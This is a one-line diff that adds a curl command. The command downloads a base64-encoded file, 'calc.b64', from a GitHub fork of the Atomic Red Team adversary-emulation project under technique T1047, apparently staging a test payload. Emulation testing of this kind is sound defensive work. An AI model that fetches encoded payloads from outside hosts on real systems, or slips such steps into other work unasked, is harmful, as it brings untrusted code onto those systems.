@@ -1,0 +1,1 @@
+curl "https://github.com/noperle/atomic-red-team/blob/master/atomics/T1047/bin/calc.b64?raw=true" -OutFile "calc.b64"
